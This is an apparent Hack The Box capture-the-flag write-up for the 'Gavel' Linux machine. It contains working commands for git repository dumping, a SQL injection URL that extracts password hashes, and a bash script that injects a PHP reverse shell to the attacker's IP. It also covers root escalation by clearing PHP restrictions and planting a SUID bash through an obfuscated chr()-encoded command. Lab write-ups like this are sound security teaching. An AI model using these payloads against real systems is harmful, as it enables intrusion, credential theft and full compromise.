# Gavel — Hack The Box Write-up

**Platform:** Hack The Box  
**Machine:** Gavel  
**Difficulty:** Medium  
**OS:** Linux  
**Author:** luizgsv  

---

## Overview

Gavel is a medium-difficulty Linux machine that chains multiple realistic web application vulnerabilities into a full compromise. The attack path begins with an exposed `.git` directory leaking the application source code, progresses through an authenticated SQL injection to dump credentials, leverages PHP code execution via unsafe auction rule evaluation for initial access, and concludes with privilege escalation to root by abusing a custom YAML-based submission utility that processes rules in a privileged context.

---

## Reconnaissance

### Network Scan

```bash
nmap -sCV -A 10.129.242.203
```

**Open ports:**
- **22/tcp** — OpenSSH 8.9p1 (Ubuntu)
- **80/tcp** — Apache 2.4.52 — Application: *Gavel Auction*

The Nmap `http-git` script immediately flagged a critical misconfiguration: the `.git` directory was publicly accessible over HTTP, exposing the full repository structure and commit history.

### Host Configuration

```bash
echo "10.129.242.203 gavel.htb" | sudo tee -a /etc/hosts
```

---

## Web Application Enumeration

Navigating to `http://gavel.htb` revealed **Gavel 2.0**, a fully themed auction platform. The application allowed unrestricted account registration at `/register.php`.

Directory enumeration with `ffuf` confirmed the following endpoints:
- `/login.php`, `/register.php`, `/index.php` — publicly accessible
- `/admin.php`, `/inventory.php` — returned 302 redirects (auth required)
- `/.git/` — **fully accessible**, confirming repository exposure

---

## Git Repository Extraction

With the `.git` directory exposed, the full source code was reconstructed locally using `git-dumper`:

```bash
pip install git-dumper --break-system-packages
git-dumper http://gavel.htb/.git/ ./gavel-source
```

A corrupt git object (`d5c19832...`) was encountered during checkout. It was resolved by removing the corrupt object and forcing checkout:

```bash
rm .git/objects/d5/c19832a940c96c019a145cee71d325d8159134
git checkout . 2>&1
```

This recovered all PHP source files: `admin.php`, `inventory.php`, `bidding.php`, `register.php`, `login.php`, and the `includes/` directory.

---

## Source Code Analysis

### SQL Injection — `inventory.php`

Reviewing `inventory.php` revealed that the `user_id` GET parameter was interpolated directly into a SQL query without sanitization:

```php
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
```

The `user_id` parameter could be abused with a UNION-style subquery injection.

### Remote Code Execution — `includes/bid_handler.php`

The bid handler revealed a critical design flaw: auction rules are evaluated at runtime using `runkit_function_add()`, meaning any value stored in the `rule` column of the `auctions` table is executed directly as PHP code:

```php
runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
$allowed = ruleCheck($current_bid, $previous_bid, $bidder);
```

This provides a direct path to Remote Code Execution for anyone with access to the Admin Panel.

---

## SQL Injection — Credential Extraction

After registering an account and authenticating, the SQL injection was triggered by visiting the following URL directly in the browser:

```
http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-&sort=\?;--+-%00
```

The inventory panel rendered the full contents of the `users` table, including bcrypt hashes for all users. The `auctioneer` account hash was identified and saved for cracking.

---

## Password Cracking

The bcrypt hash for `auctioneer` was cracked offline using John the Ripper:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Despite bcrypt being a strong hashing algorithm, the password was present in the `rockyou.txt` wordlist and was cracked within seconds.

---

## Admin Panel Access & Rule Injection

Logging in as `auctioneer` revealed the **Admin Panel**, confirming the elevated role. The panel exposed a **Rules** editor for active auction lots — the exact execution vector identified during source code review.

### Setting Up the Listener

```bash
nc -lvnp 5555
```

### Identifying Active Auctions

```bash
curl -s http://gavel.htb/bidding.php \
  -H 'Cookie: gavel_session=<SESSION>' \
  | grep -oP 'name="auction_id" value="\K[0-9]+'
```

### Automating Rule Injection + Trigger

Due to the 120-second auction timer, a script was used to inject the malicious rule and immediately trigger execution before timeout:

```bash
cat > /tmp/exploit.sh << 'EOF'
#!/bin/bash
SESSION="<SESSION>"
MYIP="10.10.14.26"

while true; do
  IDS=$(curl -s "http://gavel.htb/bidding.php" \
    -H "Cookie: gavel_session=$SESSION" \
    | grep -oP 'name="auction_id" value="\K[0-9]+')

  for ID in $IDS; do
    curl -s -X POST "http://gavel.htb/admin.php" \
      -H "Cookie: gavel_session=$SESSION" \
      --data-urlencode "auction_id=$ID" \
      --data-urlencode 'rule=system("bash -c '\''bash -i >& /dev/tcp/10.10.14.26/5555 0>&1'\''"); return true;' \
      --data-urlencode "message=test" > /dev/null

    RESULT=$(curl -s -X POST http://gavel.htb/includes/bid_handler.php \
      -H "X-Requested-With: XMLHttpRequest" \
      -H "Cookie: gavel_session=$SESSION" \
      -d "auction_id=$ID&bid_amount=70000")

    if echo "$RESULT" | grep -q '"success":true'; then
      exit 0
    fi
  done
  sleep 3
done
EOF
chmod +x /tmp/exploit.sh
bash /tmp/exploit.sh
```

A reverse shell was received as `www-data`.

---

## User Flag

Shell was stabilized and lateral movement performed:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
su auctioneer  # password obtained from cracking step
cat /home/auctioneer/user.txt
```

✅ **User flag captured.**

---

## Privilege Escalation — Root via `gavel-util`

### Local Enumeration

Post-exploitation enumeration revealed a custom daemon and helper binary:

```bash
ls -la /opt/gavel/
# gaveld (root-owned daemon), .config/, submission/

ls -la /usr/local/bin/
# -rwxr-xr-x 1 root gavel-seller 17688 gavel-util
```

The `auctioneer` user belongs to the `gavel-seller` group, granting access to `gavel-util`. The utility submits YAML files to a queue processed by the root-owned `gaveld` daemon — and the `rule` field is executed as PHP by the daemon.

### Step 1 — Disable PHP Restrictions

The daemon's PHP sandbox had `disable_functions` blocking execution functions. The first submission overwrote the PHP configuration to clear all restrictions:

```bash
echo 'name: fixini' > ~/fix_ini.yaml
echo 'description: fix php ini' >> ~/fix_ini.yaml
echo 'image: "x.png"' >> ~/fix_ini.yaml
echo 'price: 1' >> ~/fix_ini.yaml
echo 'rule_msg: "fixini"' >> ~/fix_ini.yaml
echo "rule: file_put_contents('/opt/gavel/.config/php/php.ini', \"engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n\"); return false;" >> ~/fix_ini.yaml

/usr/local/bin/gavel-util submit ~/fix_ini.yaml
```

After ~30 seconds, the daemon processed the rule and `disable_functions` was confirmed empty:

```bash
cat /opt/gavel/.config/php/php.ini | grep disable_functions
# disable_functions=
```

### Step 2 — Create SUID Bash Binary

With execution restrictions cleared, a second submission copied `/bin/bash` to a controlled path and set the SUID bit:

```bash
echo 'name: rootshell' > ~/rootshell.yaml
echo 'description: suid bash' >> ~/rootshell.yaml
echo 'image: "x.png"' >> ~/rootshell.yaml
echo 'price: 1' >> ~/rootshell.yaml
echo 'rule_msg: "rootshell"' >> ~/rootshell.yaml
printf 'rule: "system(chr(99).chr(112).chr(32).chr(47).chr(98).chr(105).chr(110).chr(47).chr(98).chr(97).chr(115).chr(104).chr(32).chr(47).chr(111).chr(112).chr(116).chr(47).chr(103).chr(97).chr(118).chr(101).chr(108).chr(47).chr(114).chr(111).chr(111).chr(116).chr(98).chr(97).chr(115).chr(104).chr(59).chr(32).chr(99).chr(104).chr(109).chr(111).chr(100).chr(32).chr(117).chr(43).chr(115).chr(32).chr(47).chr(111).chr(112).chr(116).chr(47).chr(103).chr(97).chr(118).chr(101).chr(108).chr(47).chr(114).chr(111).chr(111).chr(116).chr(98).chr(97).chr(115).chr(104)); return false;"\n' >> ~/rootshell.yaml

/usr/local/bin/gavel-util submit ~/rootshell.yaml
```

### Step 3 — Execute Root Shell

```bash
ls -l /opt/gavel/rootbash
# -rwsr-xr-x 1 root root 1396520 rootbash

/opt/gavel/rootbash -p
whoami
# root

cat /root/root.txt
```

✅ **Root flag captured.**

---

## Vulnerability Summary

| Stage | Vulnerability | Impact |
|---|---|---|
| Recon | Exposed `.git` directory | Full source code disclosure |
| Web | SQL Injection in `inventory.php` (`user_id`) | Credential dump |
| Web | PHP RCE via `runkit_function_add()` in bid rules | Remote shell as `www-data` |
| PrivEsc | Unsanitized YAML rule execution by root daemon (`gaveld`) | Root access |

---

## Tools Used

- `nmap` — Network scanning
- `ffuf` — Directory enumeration
- `git-dumper` — Git repository extraction
- `john` — Password cracking
- `curl` — HTTP exploitation
- `netcat` — Reverse shell listener

---

*Write-up by **luizgsv***  
*This write-up was created in compliance with Hack The Box's terms of service and write-up policies. Flags and credentials have been intentionally omitted. Content is shared strictly for educational purposes within the ethical hacking community.*
